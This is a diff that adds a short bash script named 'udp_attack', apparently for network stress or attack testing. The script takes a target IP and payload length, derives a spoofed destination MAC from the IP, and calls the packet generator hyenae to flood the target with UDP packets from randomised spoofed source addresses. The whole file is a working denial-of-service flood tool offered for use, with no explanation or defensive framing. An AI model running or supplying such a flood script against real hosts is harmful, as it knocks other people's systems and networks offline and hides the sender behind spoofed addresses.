@@ -1,0 +1,8 @@
+#!/bin/bash
+#usage
+#./udp_attack [targetIp] [PayloadLength]
+myMac=`/sbin/ifconfig | grep 'eth0' | tr -s ' ' | cut -d ' ' -f5`
+targetIp=$1
+postfix=${targetIp##1*.}
+result=`echo "obase=16; $postfix" | bc`
+hyenae -I 3 -a udp -p $2 -A 4 -s ${myMac}-10.%%%.%%%.6@%%%% -d 00:00:00:00:00:0$result-$1@%%%% -E 200
